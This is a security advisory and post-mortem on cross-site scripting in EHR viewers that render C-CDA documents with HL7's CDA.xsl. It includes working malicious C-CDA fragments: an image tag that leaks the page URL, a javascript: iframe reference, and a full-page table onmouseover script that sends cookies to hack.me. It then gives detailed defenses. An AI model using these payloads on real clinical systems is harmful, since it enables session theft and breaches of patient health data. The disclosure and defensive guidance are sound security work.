### TL;DR: If you're using XSLT "stylesheets" to render C-CDAs from external sources, it's essential that you understnd the security considerations described below, or you may be at risk of data breach.

## Vulnerabilty report

Last week I discovered a security vulnerability in a **well-known commericial
EHR product** that I'll pseudonomously call "Friendly Web EHR". I reported it
to the vendor; they fixed the problem; and this is the write-up. But the story
may not be finished: the vulnerability was a result, in part, of the
vendor's reliance on an XML Transform or "stylesheet" provided by HL7 as an
accompaniment to the C-CDA specification, which means...

### Other EHR vendors may be affected too

It's very likely that other vendor products are affected, so if your product
displays C-CDA documents as HTML, please have somone from your security team
review this post-mortem, understand the risks, and ensure that the proposed
fixes are in place.

### View a document → suffer a data breach

The short story is: Friendly Web EHR's C-CDA viewer was vulnerable to
cross-site scripting attacks. If a clinical user merely *viewed* a malicous
C-CDA, that document could proceed to execute JavaScript code in the browser,
steal the user's EHR session tokens, and relay them to a third party.

Let me say that again: simply viewing a document could cause a clinician to
leak full EHR priviliges to a remote third party attacker. The attacker could
then proceed to download data about any patient in the practice.

#### This kind of thing can get bad *fast*
I didn't see this specific problem with Friendly Web EHR, but a clever attacker
might chain this kind of vulnerability into a **viral vector** that could
spread across practices: by manipulating a vendor's internal API, the attacker
might use stolen session tokens to:

1. Fetch all contacts from a user's address book
2. Spam all contacts with a referral note or Direct message that included an infected C-CDA document 
3. Harvest vast amounts of protected health information

### See it in action

If you like to learn by poking under the covers, then poke around this re-enactment...

* source @ https://github.com/chb/ccda-xslt-vulnerabilities
* demo @ https://chb.github.io/ccda-xslt-vulnerabilities

### Two fundamental attacks

Many vendors appear to be using (slightly modified) versions of the
[CDA.xsl](https://github.com/chb/sample_ccdas/blob/master/CDA.xsl) that comes
with HL7's C-CDA release. This provides potential attackers with a highly
visible, leveragable target.

Based on my analysis of the XSLT, there are at least two ways to craft a
malacious C-CDA. We'll discuss both in detail:

1. Contrive to place `img` tags in the rendered document that leak application
   state in an HTTP `Referer` header.
2. Contrive to execute JavaScript code anytime the C-CDA is loaded (cross-site
   scripting).

#### Leaking application state through externally loaded images

Searching CDA.xsl for the term `img`, we see there are two places where this
stylesheet can output image tags. Both occur within the `renderMultiMedia`
template definition:

```
<xsl:template match="n1:renderMultiMedia">
  <xsl:variable name="imageRef" select="@referencedObject" />
      <!-- snipped for brevity -->
      <xsl:if
        test="//n1:observationMedia[@ID=$imageRef]/n1:value[@mediaType='image/gif' or @mediaType='image/jpeg']">
        <br clear="all" />
        <xsl:element name="img">
          <xsl:attribute name="src"><xsl:value-of
              select="//n1:observationMedia[@ID=$imageRef]/n1:value/n1:reference/@value" /></xsl:attribute>
        </xsl:element>
      </xsl:if>
      <!-- snipped for brevity -->
</xsl:template>
```

By constructing an appropriate `section` in a C-CDA document to act as input to
the template above, we can cause the browser to leak the current page URL to
`https://hack.me`:

```
<text>
  This image loads from an external server...
  <renderMultiMedia referencedObject="MM1"></renderMultiMedia>
</text>
<entry>
  <observationMedia ID="MM1">
    <id root="10.23.4567.345"/>
    <value xsi:type="ED" mediaType="image/jpeg">
      <reference value="https://hack.me/leaked-from-image.png"/>
    </value>
  </observationMedia>
</entry>
```

#### Executing arbitrary JavaScript from a C-CDA document 

##### Via `iframe` in nonXMLBody
One interesting opportunity for injection attacks is the default handling of a `nonXMLBody` CDA. 

```
<xsl:template match='n1:component/n1:nonXMLBody'>
  <xsl:choose>
  <!-- if there is a reference, use that in an IFRAME -->
  <xsl:when test='n1:text/n1:reference'>
  <IFRAME name='nonXMLBody' id='nonXMLBody' WIDTH='80%' HEIGHT='600' src='{n1:text/n1:reference/@value}' />
</xsl:when>
```

Yikes! This means we can get javascript to execute if we can supply it in a reference like:

```
<nonXMLBody>
  <text>
    <reference value="javascript:alert(window.parent.location);"/>
  </text>
</nonXMLBody>
```

##### Via rogue attributes

Where else can we look for weaknesses? Well, it would be "nice" to find a way
to get a `script` tag inserted in the rendered document, but the XSLT is pretty
careful about creating new elements. There are a few programmatic calls to
`xsl:element`, but they all include hard-coded values for the element name.
We'll have to think outside of the box...

Well, there are various ways to execute JavaScript within a Web page -- and
they include `onmouseover` attributes. Looking through attribute handling, we
see a highly permissive "copy all" strategy applied to the attributes on a table:

```
<!-- Tables -->
<xsl:template
  match="n1:table/@*|n1:thead/@*|n1:tfoot/@*|n1:tbody/@*|n1:colgroup/@*|n1:col/@*|n1:tr/@*|n1:th/@*|n1:td/@*">
  <xsl:copy>
    <xsl:copy-of select="@*" />
    <xsl:apply-templates />
  </xsl:copy>
```

What this says is: "when you find a `table` in the C-CDA document, just copy
all of its XML attributes right into the rendered document. Bingo! We can use
this to inject JavaScript in the resulting document. For example, we can easily
steal cookies and pass them back to an external server with:
something like:

```
<table onmouseover="
  var i=document.createElement('img');
  i.style.display='none';
  i.src='https://hack.me/from/'+
        encodeURIComponent(document.URL)+
        '/cookie/'+
        encodeURIComponent(document.cookie);
  document.body.appendChild(i);"></table>
```

That's a good start but it'll only ever work if the user moves the mouse
over what could be a small, isolated table in the C-CDA document. Let's fix
that with some snazzy styling:

```
<table style="height: 100%;
              z-index: 10;
              width: 100%;
              position: fixed;
              left: 0px;
              top: 0px;" 
       onmouseover="[as before]" style=""></table>
```

Now our infected table covers the entire document area, so moving the mouse
anywhere within the document will cause our code to run. That's more like it!
You may want to [check out these tricks in
action](https://chb.github.io/chb/ccda-xslt-vulnerabilities).

## How to protect yourself: a defense-in-depth approach

There are many, many ways to defend against an attack like this. In one sense,
it's not at all hard. But mistakes can be subtle, so it's extremely valuable to
protect yourself in a systematic way. By thinking
systematically, you can help prevent not only the attacks that you're
imaginitive enough to foresee, but others, too.

We'll discuss strategies to:

1. Keep bad documents out
2. If bad documents get in, prevent them from running code in the browser
3. If bad documents run code in the browser, ensure they can't steal critical application state like security tokens
4. If bad documents steal security tokens, limit the damage

### Keep bad documents out

The simplest practice here is to validate all incoming C-CDA documents against
the official CDA schema from HL7. Unfortunately the schema aren't easily
accessible on the Web (like so much of HL7's output), so the best I can do is
[link to the
zip](https://www.hl7.org/documentcenter/private/standards/cda/CDAR2_IG_IHE_CONSOL_DSTU_R1dot1_2012JUL.zip)
that contains the schema. This validation would reject documents containing
invalid attributes like `onmouseover` or `style`:

```
$ xmllint --schema CDA.xsd  potentially-valid-ccda.xml

Schemas validity error: 
  Element '{urn:hl7-org:v3}table', attribute 'onmousover':
    The attribute 'onmousover' is not allowed.
```

That's certainly a good start -- and if Friendly Web EHR had done something
like this before passing a C-CDA document into an XSL transform process, they
wouldn't have been vulnerable to the "rogue attributes" attack described above.

But validation alone won't ensure safety... you also need to


### Prevent documents from running code or loading external images

The next line of defense is to ensure that bad documents can't do bad things,
even if they do make it into our system. There are two key recommendations here:

1. Fix up the XSLT. Specifically: augment it to prevent blindly copying "all attributes" when
   rendering tables, and consider blocking external images as well).

2. Load the rendered C-CDA inside `<iframe SANDBOX="">` to prevent any
   JavaScript from running. This won't work on all browsers, but it provides an
extra measure of protection [where it does
work](http://caniuse.com/#feat=iframe-sandbox).

### Prevent documents from stealing critical application state even if they can run code or load images

Let's assume all our defenses up to this point have failed. With the right
protections in place, we can stay safe. At this level, we want to ensure that
C-CDAs are rendered and displayed in a "protected" environment, which means:

 * **No secret state embedded in the URL**. For example, it's a bad practice to
   use `iframe` source URLs with embedded tokens like
`/patient/john-smith/ccda/rendered?secret_token=123abc`. If you need to pass
credential to your C-CDA viewer, do it via `POST` instead of `GET`, or hide the
logic behind a token-stripping `redirect`. 

 * **No secret state in JavaScript-accessible cookies**. If you're using cookies
   for authentication, ensure that they're inaccessible to JavaScript (that is:
use the `httpOnly` flag, and `secure` for good measure).

 * **No shared origin with the parent frame**. If your `iframe` share its
   origin with the parent frame, then any code running within the `iframe` has
full access to the application state of the parent frame. This is dangerous! (
(See the effect of a compromise in  [the demo](https://chb.github.io/chb/ccda-xslt-vulnerabilities).) 
It's safer to load the C-CDA viewer in its own origin, where it simply can't
"see" the surrounding application. Better still, ensure that the C-CDA viewer
does not share a subdomain with the parent window, to ensure there is not even
an opportunity for shared cookies. 

### Limit the damage of exposed tokens

If all else fails, we can endeavor to limit the damage from leaked tokens. At this
point we're already dealing with a breach of protected health information, but
a small breach is much, much better than a massive one.  In this category we
have approaches like:

 * Bind sessions to end-user IP addresses, or at least geographical regions. If
   an attacker does steal a session token, we can still prevent the wholesale
   exposure of patient data directly to a remote sever.  Keep in mind that
this isn't an ircon-clad fix. An attacker can always hijack the end-user's
browser to execute and proxy arbitrary HTTP requests. For a vivid depiction of
how bad things can get, and how fast, see Krzysztof Kotowicz's [detailed blog
post](http://blog.kotowicz.net/2013/12/rapportive-xsses-gmail-or-have-yourself.html) (and especially the video!)
describing the exploitation of a vulnerability in the
[Rapportive](https://rapportive.com/) Chrome extension.

 * Monitor access patterns in realtime, and respond to anomolous behavior. Too
   many requests using a given access token, over too short a period of time,
for example, should trigger session expiration and user account locking.


## Bugs happen. Be prepared!

In any complex system, bugs -- including security vulnerabilities -- are a fact of life.
But an important part of being prepared is having a well-defined channel for 
security researchers, concerned citizens, and others to reach out
and report what they find. This could take the form of:

 * Bug Bounty or "Whitehat" program like [Facebook's](https://www.facebook.com/whitehat)
 * Well-defined vulnerability reporting page like [Twitter's](https://support.twitter.com/forms/security)

These programs sometimes award fame, or cash -- but they key point is that they provide 
a single "right way" to report issues.  Here's a [whole list of programs](https://bugcrowd.com/list-of-bug-bounty-programs/) that
you can explore. Please use them to model your own!
